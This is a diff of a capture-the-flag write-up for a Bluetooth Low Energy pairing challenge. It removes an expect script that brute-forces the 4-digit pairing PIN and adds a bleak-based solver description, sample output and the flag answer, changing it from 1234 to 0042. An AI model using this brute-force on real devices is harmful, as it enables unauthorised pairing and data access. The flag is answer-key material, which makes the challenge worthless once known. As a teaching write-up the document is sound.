@@ -2,11 +2,13 @@
 
 **Difficulty:** ⭐⭐⭐⭐ Advanced
 **Category:** Bluetooth Low Energy
-**Flag:** `WOCSA{pin_1234_is_not_a_password}`
+**Flag:** `WOCSA{pin_0042_is_not_a_password}`
 
 ---
 
 ## 🔍 Step 1: Connect and Observe the Pairing Requirement
+
+Scan for the device and note its MAC address:
 
 ```bash
 bluetoothctl
@@ -30,80 +32,36 @@ Failed to pair: org.bluez.Error.AuthenticationFailed
 
 ## 🔓 Step 2: Automate the Brute-Force
 
-Since manually trying 10,000 PINs is impractical, use `expect` to automate `bluetoothctl`:
+Since manually trying 10,000 PINs is impractical, use `solve.py` to automate the brute-force entirely with `bleak` (+ `dbus-fast`, which is already a bleak dependency on Linux):
 
 ```bash
-#!/usr/bin/expect -f
-# brute_force.expect
-
-set mac "AA:BB:CC:DD:EE:FF"
-set timeout 5
-
-for {set pin 0} {$pin <= 9999} {incr pin} {
-    set padded_pin [format "%04d" $pin]
-    puts "Trying PIN: $padded_pin"
-
-    spawn bluetoothctl
-    expect "Agent registered"
-
-    send "remove $mac\r"
-    after 500
-
-    send "pair $mac\r"
-    expect "Enter passkey"
-
-    send "$padded_pin\r"
-
-    expect {
-        "Pairing successful" {
-            puts "\n\[+\] SUCCESS! PIN = $padded_pin"
-            send "disconnect $mac\r"
-            send "quit\r"
-            exit 0
-        }
-        "AuthenticationFailed" {
-            send "quit\r"
-        }
-        timeout {
-            send "quit\r"
-        }
-    }
-}
+pip install bleak
+python3 solve.py           # normal
+python3 solve.py --debug   # verbose BlueZ agent output
 ```
 
-```bash
-chmod +x brute_force.expect
-./brute_force.expect
+```
+Enter target MAC address: AA:BB:CC:DD:EE:FF
+[*] Brute-forcing PIN on AA:BB:CC:DD:EE:FF (0000-9999)...
+[*] Trying PIN: 0042
+[+] SUCCESS! PIN = 0042
+[*] Reading flag characteristic...
+[!!!] FLAG: WOCSA{pin_0042_is_not_a_password}
 ```
 
----
-
-## 📖 Step 3: Read the Flag After Successful Pairing
-
-Once paired with PIN `1234`:
-
-```bash
-gatttool -b AA:BB:CC:DD:EE:FF -I
-[AA:BB:CC:DD:EE:FF][LE]> connect
-[AA:BB:CC:DD:EE:FF][LE]> char-read-uuid b1eb1eb1-0001-1000-8000-00805f9b34fb
-```
-
-Expected output:
-```
-handle: 0x0003   value: 57 4f 43 53 41 7b 70 69 6e 5f 31 32 33 34 5f 69 73 5f 6e 6f 74 5f 61 5f 70 61 73 73 77 6f 72 64 7d
-```
-
-Decode:
-```
-WOCSA{pin_1234_is_not_a_password}
-```
+The script (`solve.py`, next to this file):
+1. Prompts for the target MAC address
+2. Registers a custom BlueZ D-Bus pairing agent via `dbus-fast`
+3. Iterates PINs `0000`–`9999` — the agent provides the current PIN whenever BlueZ calls `RequestPasskey`
+4. After each failed attempt, removes the device from BlueZ so the next `Pair()` call starts fresh
+5. On success, reads the flag characteristic directly with `bleak`
 
 ---
 
 ## 🎯 Flag
 
 ```
-WOCSA{pin_1234_is_not_a_password}
+WOCSA{pin_0042_is_not_a_password}
 ```
 
 ---
